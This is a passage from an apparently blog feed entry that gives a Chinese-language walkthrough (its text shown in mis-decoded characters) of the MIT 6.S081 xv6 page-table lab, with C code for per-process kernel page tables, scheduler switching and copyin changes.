allocprocçš„è°ƒç”¨ã€‚allocprocå‡½æ•°è¿”å›ä¸€ä¸ªæœªè¢«åˆ©ç”¨çš„è¿›ç¨‹ï¼Œå¹¶ä¸”åšåˆå§‹åŒ–å·¥ä½œï¼Œæ¯”å¦‚ä¸‹é¢çš„è¿™ä¸€äº›ä»£ç æ¥è‡ªallocprocï¼Œåšäº†ç”¨æˆ·é¡µè¡¨çš„åˆå§‹åŒ–å·¥ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// An empty user page table.</span><br>p-&gt;pagetable = proc_pagetable(p);<br><span class="hljs-keyword">if</span>(p-&gt;pagetable == <span class="hljs-number">0</span>)&#123;<br>  freeproc(p);<br>  release(&amp;p-&gt;lock);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åŒæ ·çš„ï¼Œæ—¢ç„¶å·²ç»åœ¨ç»“æ„ä½“é‡Œé¢åŠ äº†kpgtableï¼Œé‚£ä¹ˆä¹Ÿè¦ç»™è¿›ç¨‹çš„å†…æ ¸æ€é¡µè¡¨åšåˆå§‹åŒ–å·¥ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">p-&gt;kpgtable=ukvminit();<br><span class="hljs-keyword">if</span>(p-&gt;kpgtable == <span class="hljs-number">0</span>)&#123;<br>  freeproc(p);<br>  release(&amp;p-&gt;lock);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨procinitå‡½æ•°ä¸­ï¼Œä¸ºäº†ç»™è¿›ç¨‹åˆå§‹åŒ–å†…æ ¸æ ˆï¼Œæœ‰è¿™æ ·ä¸€æ®µä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Allocate a page for the process&#x27;s kernel stack.</span><br><span class="hljs-comment">// Map it high in memory, followed by an invalid</span><br><span class="hljs-comment">// guard page.</span><br><span class="hljs-keyword">char</span> *pa = kalloc();<br><span class="hljs-keyword">if</span>(pa == <span class="hljs-number">0</span>)<br>  panic(<span class="hljs-string">&quot;kalloc&quot;</span>);<br>uint64 va = KSTACK((<span class="hljs-keyword">int</span>) (p - proc));<br>kvmmap(va, (uint64)pa, PGSIZE, PTE_R | PTE_W);<br>p-&gt;kstack = va;<br></code></pre></td></tr></table></figure><p>ç±»ä¼¼çš„ï¼Œåœ¨allocprocå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬éœ€è¦åˆå§‹åŒ–å†…æ ¸æ ˆå¹¶å°†å…¶æ˜ å°„åˆ°è¿›ç¨‹å•ç‹¬çš„å†…æ ¸é¡µè¡¨ï¼Œéœ€è¦åŠ ä¸Šï¼šï¼ˆåœ¨è¿™ä¹‹åå¯ä»¥å°†procinitä¸­åˆå§‹åŒ–å†…æ ¸æ ˆçš„ä»£ç æ³¨é‡Šæ‰ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">p-&gt;kpgtable=ukvminit();<br><span class="hljs-keyword">if</span>(p-&gt;kpgtable == <span class="hljs-number">0</span>)&#123;<br>  freeproc(p);<br>  release(&amp;p-&gt;lock);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">char</span> *pa = kalloc();<br><span class="hljs-keyword">if</span>(pa == <span class="hljs-number">0</span>)<br>  panic(<span class="hljs-string">&quot;kalloc&quot;</span>);<br>uint64 va = KSTACK((<span class="hljs-keyword">int</span>) (p - proc));<br>ukvmmap(p-&gt;kpgtable, va, (uint64)pa, PGSIZE, PTE_R | PTE_W);<br>p-&gt;kstack = va;<br></code></pre></td></tr></table></figure><p>freeprocå‡½æ•°ï¼Œè¦å°†è¿›ç¨‹çš„å†…æ ¸é¡µè¡¨è¿›è¡Œæ¸…é™¤</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// free a proc structure and the data hanging from it,</span><br><span class="hljs-comment">// including user pages.</span><br><span class="hljs-comment">// p-&gt;lock must be held.</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">freeproc</span><span class="hljs-params">(struct proc *p)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span>(p-&gt;trapframe)<br>    kfree((<span class="hljs-keyword">void</span>*)p-&gt;trapframe);<br>  p-&gt;trapframe = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span>(p-&gt;pagetable)<br>    proc_freepagetable(p-&gt;pagetable, p-&gt;sz);<br>  <span class="hljs-comment">/* add here */</span><br>  <span class="hljs-keyword">if</span> (p-&gt;kstack)<br>  &#123;<br>      <span class="hljs-keyword">pte_t</span>* pte = walk(p-&gt;kpgtable, p-&gt;kstack, <span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">if</span> (pte == <span class="hljs-number">0</span>)<br>          panic(<span class="hljs-string">&quot;freeproc: walk&quot;</span>);<br>      kfree((<span class="hljs-keyword">void</span>*)PTE2PA(*pte));<br>  &#125;<br>  p-&gt;kstack = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">if</span> (p-&gt;kpgtable)<br>    freewalk_kproc(p-&gt;kpgtable);<br>  <span class="hljs-comment">/* add here */</span><br>  p-&gt;pagetable = <span class="hljs-number">0</span>;<br>  p-&gt;sz = <span class="hljs-number">0</span>;<br>  p-&gt;pid = <span class="hljs-number">0</span>;<br>  p-&gt;parent = <span class="hljs-number">0</span>;<br>  p-&gt;name[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  p-&gt;chan = <span class="hljs-number">0</span>;<br>  p-&gt;killed = <span class="hljs-number">0</span>;<br>  p-&gt;xstate = <span class="hljs-number">0</span>;<br>  p-&gt;state = UNUSED;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦æ¨¡ä»¿freewalké‡æ–°å®ç°freewalk_kprocï¼Œä½¿å¾—ä»…ä»…è§£é™¤é¡µè¡¨çš„å†…å­˜æ˜ å°„è€Œä¸åƒfreewalkä¸€æ ·æ¸…é™¤ç‰©ç†é¡µæ•°æ®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">freewalk_kproc</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable)</span> </span>&#123;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">512</span>; i++)&#123;<br>    <span class="hljs-keyword">pte_t</span> pte = pagetable[i];<br>    <span class="hljs-keyword">if</span>((pte &amp; PTE_V))&#123;<br>      pagetable[i] = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> ((pte &amp; (PTE_R|PTE_W|PTE_X)) == <span class="hljs-number">0</span>)<br>      &#123;<br>        uint64 child = PTE2PA(pte);<br>        freewalk_kproc((<span class="hljs-keyword">pagetable_t</span>)child);<br>      &#125;<br>    &#125;<br>  &#125;<br>  kfree((<span class="hljs-keyword">void</span>*)pagetable);<br>&#125;<br></code></pre></td></tr></table></figure><p> åœ¨è°ƒåº¦ç¨‹åºschedulerä¸­ï¼Œè°ƒåº¦ç¨‹åºä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦åˆ‡æ¢åˆ°è¿›ç¨‹è‡ªå·±çš„å†…æ ¸é¡µè¡¨å¤„ï¼Œå¹¶ä½¿ç”¨sfence.vmaåˆ·æ–°å½“å‰ CPU çš„ TLB</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Per-CPU process scheduler.</span><br><span class="hljs-comment">// Each CPU calls scheduler() after setting itself up.</span><br><span class="hljs-comment">// Scheduler never returns.  It loops, doing:</span><br><span class="hljs-comment">//  - choose a process to run.</span><br><span class="hljs-comment">//  - swtch to start running that process.</span><br><span class="hljs-comment">//  - eventually that process transfers control</span><br><span class="hljs-comment">//    via swtch back to the scheduler.</span><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">scheduler</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cpu</span> *<span class="hljs-title">c</span> =</span> mycpu();<br>  <br>  c-&gt;proc = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span>(;;)&#123;<br>    <span class="hljs-comment">// Avoid deadlock by ensuring that devices can interrupt.</span><br>    intr_on();<br>    <br>    <span class="hljs-keyword">int</span> found = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;<br>      acquire(&amp;p-&gt;lock);<br>      <span class="hljs-keyword">if</span>(p-&gt;state == RUNNABLE) &#123;<br>        <span class="hljs-comment">// Switch to chosen process.  It is the process&#x27;s job</span><br>        <span class="hljs-comment">// to release its lock and then reacquire it</span><br>        <span class="hljs-comment">// before jumping back to us.</span><br>        p-&gt;state = RUNNING;<br>        c-&gt;proc = p;<br>        <span class="hljs-comment">//åˆ‡æ¢åˆ°è¿›ç¨‹è‡ªå·±çš„å†…æ ¸é¡µè¡¨å¤„</span><br>        w_satp(MAKE_SATP(p-&gt;kpgtable));<br>        <span class="hljs-comment">//ä½¿ç”¨sfence.vmaåˆ·æ–°å½“å‰ CPU çš„ TLB</span><br>        sfence_vma();<br>        <span class="hljs-comment">//è°ƒåº¦è¿›ç¨‹</span><br>        swtch(&amp;c-&gt;context, &amp;p-&gt;context);<br>        <span class="hljs-comment">//åˆ‡æ¢å›å†…æ ¸é¡µè¡¨</span><br>        kvminithart();<br>        <br>        <span class="hljs-comment">// Process is done running for now.</span><br>        <span class="hljs-comment">// It should have changed its p-&gt;state before coming back.</span><br>        c-&gt;proc = <span class="hljs-number">0</span>;<br><br>        found = <span class="hljs-number">1</span>;<br>      &#125;<br>      release(&amp;p-&gt;lock);<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> !defined (LAB_FS)</span><br>    <span class="hljs-keyword">if</span>(found == <span class="hljs-number">0</span>) &#123;<br>      intr_on();<br>      <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;wfi&quot;</span>)</span></span>;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    ;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»™ vm.c æ·»åŠ å¤´æ–‡ä»¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;spinlock.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;proc.h&quot;</span><span class="hljs-comment">//å¦‚æœé¡ºåºé¢ å€’ä¼šæŠ¥ç»“æ„ä½“å®šä¹‰é”™è¯¯</span></span><br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ <code>kvmpa</code> å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">pte = walk(myproc()-&gt;kpgtable, va, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h2 id="Simplify-copyin-copyinstr"><a href="#Simplify-copyin-copyinstr" class="headerlink" title="Simplify copyin/copyinstr"></a>Simplify <code>copyin/copyinstr</code></h2><blockquote><p>å†…æ ¸çš„ copyin å‡½æ•°è¯»å–ç”¨æˆ·æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ã€‚å®ƒé€šè¿‡å°†å®ƒä»¬è½¬æ¢ä¸ºç‰©ç†åœ°å€æ¥å®ç°è¿™ä¸€ç‚¹ï¼Œè€Œå†…æ ¸å¯ä»¥ç›´æ¥å–æ¶ˆå¯¹å®ƒä»¬çš„å¼•ç”¨ã€‚å®ƒé€šè¿‡åœ¨è½¯ä»¶ä¸­éå†è¿‡ç¨‹é¡µè¡¨æ¥æ‰§è¡Œè¿™ç§è½¬æ¢ã€‚åœ¨å®éªŒå®¤çš„è¿™ä¸€éƒ¨åˆ†ä¸­ï¼Œæ‚¨çš„å·¥ä½œæ˜¯å‘æ¯ä¸ªè¿›ç¨‹çš„å†…æ ¸é¡µè¡¨(åœ¨å‰ä¸€èŠ‚ä¸­åˆ›å»º)æ·»åŠ ç”¨æˆ·æ˜ å°„ï¼Œä»¥å…è®¸ copyin (ä»¥åŠç›¸å…³çš„å­—ç¬¦ä¸²å‡½æ•° copinstr)ç›´æ¥å–æ¶ˆå¼•ç”¨ç”¨æˆ·æŒ‡é’ˆã€‚</p></blockquote><p>é¦–å…ˆå£°æ˜copyin_newå’Œcopyinstr_new</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">copyin_new</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable, <span class="hljs-keyword">char</span> *dst, uint64 srcva, uint64 len)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">copyinstr_new</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable, <span class="hljs-keyword">char</span> *dst, uint64 srcva, uint64 max)</span></span>;<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹copyinå‡½æ•°ï¼Œä½¿å¾—æ”¹ä¸ºæ‰§è¡Œcopyin_new</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">copyin</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable, <span class="hljs-keyword">char</span> *dst, uint64 srcva, uint64 len)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> copyin_new(pagetable, dst, srcva, len);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">copyinstr</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable, <span class="hljs-keyword">char</span> *dst, uint64 srcva, uint64 max)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> copyinstr_new(pagetable, dst, srcva, max);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¢åŠ ä¸€ä¸ªu2kvmcopyå‡½æ•°ï¼Œå®Œæˆé¡µè¡¨çš„å¤åˆ¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> </span><br><span class="hljs-function"><span class="hljs-title">u2kvmcopy</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> upagetable, <span class="hljs-keyword">pagetable_t</span> kpagetable, uint64 oldsz, uint64 newsz)</span></span><br><span class="hljs-function"></span>&#123;<br>  oldsz = PGROUNDUP(oldsz);<br>  <span class="hljs-keyword">for</span> (uint64 i = oldsz; i &lt; newsz; i += PGSIZE) &#123;<br>    <span class="hljs-keyword">pte_t</span>* pte_from = walk(upagetable, i, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(pte_from == <span class="hljs-number">0</span>) <br>      panic(<span class="hljs-string">&quot;pte_from&quot;</span>);<br>    <span class="hljs-keyword">pte_t</span>* pte_to = walk(kpagetable, i, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(pte_to == <span class="hljs-number">0</span>) <br>      panic(<span class="hljs-string">&quot;pte_to&quot;</span>);<br>    uint64 pa = PTE2PA(*pte_from);<br>    uint flag = (PTE_FLAGS(*pte_from)) &amp; (~PTE_U);<br>    *pte_to = PA2PTE(pa) | flag;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>userinitåŠ ä¸Šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">u2kvmcopy(np-&gt;pagetable, np-&gt;kpgtable, <span class="hljs-number">0</span>, np-&gt;sz);<br></code></pre></td></tr></table></figure><p>forkåŠ ä¸Šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">u2kvmcopy(np-&gt;pagetable, np-&gt;kpgtable, <span class="hljs-number">0</span>, np-&gt;sz);<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Create a new process, copying the parent.</span><br><span class="hljs-comment">// Sets up child kernel stack to return as if from fork() system call.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">fork</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> i, pid;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">np</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br><br>  <span class="hljs-comment">// Allocate process.</span><br>  <span class="hljs-keyword">if</span>((np = allocproc()) == <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// Copy user memory from parent to child.</span><br>  <span class="hljs-keyword">if</span>(uvmcopy(p-&gt;pagetable, np-&gt;pagetable, p-&gt;sz) &lt; <span class="hljs-number">0</span>)&#123;<br>    freeproc(np);<br>    release(&amp;np-&gt;lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  np-&gt;sz = p-&gt;sz;<br><br>  np-&gt;parent = p;<br><br>  <span class="hljs-comment">// copy saved user registers.</span><br>  *(np-&gt;trapframe) = *(p-&gt;trapframe);<br><br>  <span class="hljs-comment">// Cause fork to return 0 in the child.</span><br>  np-&gt;trapframe-&gt;a0 = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">// increment reference counts on open file descriptors.</span><br>  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; NOFILE; i++)<br>    <span class="hljs-keyword">if</span>(p-&gt;ofile[i])<br>      np-&gt;ofile[i] = filedup(p-&gt;ofile[i]);<br>  np-&gt;cwd = idup(p-&gt;cwd);<br>  u2kvmcopy(np-&gt;pagetable, np-&gt;kpgtable, <span class="hljs-number">0</span>, np-&gt;sz);<br>  safestrcpy(np-&gt;name, p-&gt;name, <span class="hljs-keyword">sizeof</span>(p-&gt;name));<br><br>  pid = np-&gt;pid;<br><br>  np-&gt;state = RUNNABLE;<br><br>  release(&amp;np-&gt;lock);<br><br>  <span class="hljs-keyword">return</span> pid;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨execå‡½æ•°åŠ ä¸Š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">u2kvmcopy(np-&gt;pagetable, np-&gt;kpgtable, <span class="hljs-number">0</span>, np-&gt;sz);<br>  <span class="hljs-comment">// Push argument strings, prepare rest of stack in ustack.</span><br>  <span class="hljs-keyword">for</span>(argc = <span class="hljs-number">0</span>; argv[argc]; argc++) &#123;<br>    <span class="hljs-keyword">if</span>(argc &gt;= MAXARG)<br>      <span class="hljs-keyword">goto</span> bad;<br>    sp -= <span class="hljs-built_in">strlen</span>(argv[argc]) + <span class="hljs-number">1</span>;<br>    sp -= sp % <span class="hljs-number">16</span>; <span class="hljs-comment">// riscv sp must be 16-byte aligned</span><br>    <span class="hljs-keyword">if</span>(sp &lt; stackbase)<br>      <span class="hljs-keyword">goto</span> bad;<br>    <span class="hljs-keyword">if</span>(copyout(pagetable, sp, argv[argc], <span class="hljs-built_in">strlen</span>(argv[argc]) + <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>      <span class="hljs-keyword">goto</span> bad;<br>    ustack[argc] = sp;<br>  &#125;<br></code></pre></td></tr></table></figure><p>growproc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Grow or shrink user memory by n bytes.</span><br><span class="hljs-comment">// Return 0 on success, -1 on failure.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">growproc</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>  uint sz;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br><br>  sz = p-&gt;sz;<br>  <span class="hljs-keyword">if</span>(n &gt; <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">if</span>((sz = uvmalloc(p-&gt;pagetable, sz, sz + n)) == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    u2kvmcopy(p-&gt;pagetable, p-&gt;kpgtable, sz-n, sz);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n &lt; <span class="hljs-number">0</span>)&#123;<br>    sz = uvmdealloc(p-&gt;pagetable, sz, sz + n);<br>  &#125;<br>  p-&gt;sz = sz;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/image-20230520212417687.png"></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="https://blog.csdn.net/rocketeerLi/article/details/121524760">https://blog.csdn.net/rocketeerLi/article/details/121524760</a></li><li><a href="https://fanxiao.tech/posts/2021-03-02-mit-6s081-notes/#38-lab-3-pgtbl">https://fanxiao.tech/posts/2021-03-02-mit-6s081-notes/#38-lab-3-pgtbl</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>MIT6S081</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MIT-6.S081å¯¼è¨€</title>
    <link href="/p/92b97892/"/>
    <url>/p/92b97892/</url>
    
    <content type="html"><![CDATA[<h1 id="MIT-6-S081"><a href="#MIT-6-S081" class="headerlink" title="MIT-6.S081"></a>MIT-6.S081</h1><p>å·²å®Œæˆï¼š</p><ul><li><input checked="" disabled="" type="checkbox"> <a href="https://github.com/LaPhilosophie/MIT-6.S081/tree/main/Preparation">Preparation</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://github.com/LaPhilosophie/MIT-6.S081/tree/main/Lab1%20Xv6%20and%20Unix%20utilities">Lab1 Xv6 and Unix utilities</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://github.com/LaPhilosophie/MIT-6.S081/tree/main/Lab2%20syscall%20System%20calls">Lab2 syscall System calls</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://gls.show/p/c98013d5/">Lab3 page table</a></li></ul><h1 id="Preparation"><a href="#Preparation" class="headerlink" 